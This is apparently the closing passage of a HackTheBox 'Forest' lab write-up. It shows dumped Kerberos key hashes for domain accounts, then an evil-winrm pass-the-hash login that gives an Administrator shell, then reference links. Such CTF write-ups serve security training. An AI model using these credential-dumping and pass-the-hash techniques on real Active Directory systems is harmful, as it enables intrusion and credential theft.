htb.local\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
htb.local\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
htb.local\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
htb.local\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
htb.local\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
htb.local\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
htb.local\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
htb.local\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
htb.local\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
htb.local\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
htb.local\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
htb.local\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
htb.local\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
htb.local\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
htb.local\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
htb.local\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
htb.local\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
htb.local\sebastien:des-cbc-md5:702a3445e0d65b58
htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
FOREST$:aes256-cts-hmac-sha1-96:c4d5fc634dee8a1e7cc4f876e7dde0f0e756c1e5720de277fd6ab0bd0a9aec14
FOREST$:aes128-cts-hmac-sha1-96:52066270e832e0b6ac549130de05ca40
FOREST$:des-cbc-md5:cb9476eaf1aec2f2
EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
EXCH01$:des-cbc-md5:8c45f44c16975129
[*] Cleaning up... 
                             
```

撈到 Hash 之後用 pass the hash 的手法去登入

```bash=
┌──(dkri3c1🐱dkri3c1)-[~]
└─$ evil-winrm -i 10.129.205.137 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
htb\administrator
*Evil-WinRM* PS C:
```

Get root Flag

`7c66...`

## Reference
https://yu-shiuan2017.medium.com/htb-forest%E9%9D%B6%E6%A9%9F-write-up-6e27b252ef11

https://ithelp.ithome.com.tw/articles/10393128

https://zh-tw.docs.tenable.com/identity-exposure/SaaS/Content/User/AttackPath/WriteDACL.htm

https://kazma.tw/2025/05/20/NCKUCTF-XY-Active-Directory-Note/

https://www.geekby.site/2020/05/dcsync-%E6%94%BB%E5%87%BB/

https://blog.whale-tw.com/2024/12/22/forest-htb/

## Pwned

![Screenshot 2026-04-27 at 4.07.39 PM](https://hackmd.io/_uploads/H1DLYq3pZg.png)
